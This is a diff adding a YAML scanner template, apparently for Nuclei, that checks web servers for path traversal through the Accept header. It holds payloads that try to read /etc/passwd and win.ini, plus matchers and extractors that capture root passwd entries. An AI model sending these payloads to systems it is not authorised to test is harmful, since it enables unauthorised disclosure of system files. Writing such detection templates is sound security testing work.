@@ -1,0 +1,46 @@
+id: rce-detection-accept-header-path-traversal
+
+info:
+  name: Remote Code Execution via Path Traversal in Accept Header
+  author: Souf.Z
+  severity: critical
+  description: Detects potential Remote Code Execution (RCE) vulnerabilities through path traversal by injecting malicious file paths (e.g., `/etc/passwd`) into the `Accept` header.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://cwe.mitre.org/data/definitions/22.html
+  tags: rce, path-traversal, headers, vulnerability, critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/{{path}}"
+      
+    headers:
+      Accept:
+        - "../../../../../etc/passwd{{"
+        - "..%2f..%2f..%2f..%2f..%2f/etc/passwd{{"
+        - "..\\..\\..\\..\\..\\windows\\win.ini{{"
+        - "....//....//....//....//....//etc/passwd{{"
+
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0"
+          - "/bin/bash"
+      - type: regex
+        part: body
+        regex:
+          - "^root:.*:0:0.*"
+          - "/bin/.*bash.*"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(root:x:0:0:.*)"
+          - "(bash:[^\\s]+)"
